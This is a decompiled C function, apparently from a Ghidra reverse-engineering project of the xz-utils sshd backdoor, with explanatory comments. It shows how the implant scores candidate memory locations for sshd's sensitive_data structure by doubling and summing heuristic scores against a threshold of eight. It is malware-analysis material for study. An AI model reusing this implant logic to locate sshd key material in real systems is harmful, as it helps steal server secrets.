// /home/kali/xzre-ghidra/xzregh/103D50_sshd_score_sensitive_data_candidate.c
// Function: sshd_score_sensitive_data_candidate @ 0x103D50
// Calling convention: __stdcall
// Prototype: int __stdcall sshd_score_sensitive_data_candidate(void * sensitive_data, elf_info_t * elf, string_references_t * refs)


/*
 * AutoDoc: Combines the per-function heuristics by doubling the `demote_sensitive_data` and `main()` scores, adding them together, and finally tacking on the `do_child` result. Only candidates that reach eight or more points are surfaced to the rest of the implant; weaker hits are ignored even if one heuristic thought they were promising.
 */

#include "xzre_types.h"

int sshd_score_sensitive_data_candidate
              (void *sensitive_data,elf_info_t *elf,string_references_t *refs)

{
  int score_demote;
  int score_main;
  int score_do_child;
  
  if (sensitive_data != (void *)0x0) {
    // AutoDoc: Pull the high-confidence score from `demote_sensitive_data` first — those three points get doubled later.
    score_demote = sshd_score_sensitive_data_candidate_in_demote_sensitive_data(sensitive_data,elf,refs);
    // AutoDoc: Fold in the `main()`-specific heuristic so candidates the daemon manipulates frequently accrue bonus weight.
    score_main = sshd_score_sensitive_data_candidate_in_main(sensitive_data,elf,refs);
    // AutoDoc: Finally, add any points earned inside `do_child`, which is the only part of the aggregate that is not doubled.
    score_do_child = sshd_score_sensitive_data_candidate_in_do_child(sensitive_data,elf,refs);
    // AutoDoc: Demote/Main scores are doubled before adding the `do_child` total, yielding the >=8 threshold enforced by callers.
    return score_do_child + (score_demote + score_main) * 2;
  }
  return 0;
}

